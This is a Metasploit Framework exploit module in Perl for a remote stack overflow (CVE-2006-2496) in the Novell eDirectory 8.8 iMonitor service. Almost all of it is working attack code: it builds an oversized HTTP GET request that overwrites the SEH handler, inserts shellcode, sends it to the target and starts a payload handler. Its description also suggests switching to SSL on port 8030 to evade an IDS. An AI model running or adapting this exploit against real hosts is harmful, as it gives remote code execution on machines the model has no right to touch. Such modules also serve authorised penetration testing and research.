
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::edirectory_imonitor2;
use strict;
use base "Msf::Exploit";
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'    => 'eDirectory 8.8 iMonitor Remote Stack Overflow',
	'Version' => '$Revision: 1.1 $',
	'Authors' => [ 'H D Moore <hdm[at]metasploit.com>' ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'winnt', 'winxp', 'win2k', 'win2003' ],
	'Priv'  => 1,

	'AutoOpts'  =>  { 'EXITFUNC' => 'thread' },

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 8028 ],
		'VHOST' => [0, 'DATA', 'The virtual host name of the server'],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Payload' =>
	  {
		'Space'     => 2000,
		'BadChars'  => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%",
		'Prepend'   => "\x81\xc4\x54\xf2\xff\xff",
		'Keys' 	    => ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a stack overflow in eDirectory 8.8 iMonitor
	service. This vulnerability was discovered by CIRT.DK and released
	through the ZDI program. This module was based on the edirectory_imonitor
	exploit supplied by an anonymous user. If you feel like evading an IDS,
	just set 'RPORT' to 8030 and 'SSL' to 1 :-)
}),

	'Refs'  =>
	  [
		['BID' => '18026'],
		['CVE' => '2006-2496'],
		['URL' => 'http://support.novell.com/cgi-bin/search/searchtid.cgi?/2973759.htm'],
	  ],

	'Targets' =>
	  [
		[ 'Windows (ALL) - eDirectory 8.8 iMonitor', 0x63501f15] # pop/pop/ret
	  ],

	'Keys'  => ['imonitor'],

	'DisclosureDate' => 'May 22 2005',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self        = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target      = $self->Targets->[$target_idx];

	$self->PrintLine( "[*] Attempting to exploit " . $target->[0] );

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'SSL'      => $self->GetVar('SSL'),
	  );

	if ( $s->IsError ) {
		$self->PrintLine( '[*] Error creating socket: ' . $s->GetError );
		return;
	}

	my $req = Pex::Text::AlphaNumText(8192);
	
	# Standard SEH overwrite... yawn
	substr($req, 4158, 4, pack('V', $target->[1]));
	substr($req, 4154, 2, "\xeb\x06");
	substr($req, 4162, length($shellcode), $shellcode);
	
	# Force this to trigger the exception (cmp [eax], 0)
	substr($req, 4102, 4, "\xff\xff\xff\xff");
	
	my $request =
	  "GET /nds/$req HTTP/1.1\r\n".
	  "Accept: */*\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "Host: $target_host:$target_port\r\n".
	  "Connection: Close\r\n".
	  "\r\n";

	$s->Send($request);

	$self->PrintLine("[*] Overflow request sent...");
	
	$self->Handler($s);
	return;
}

1;
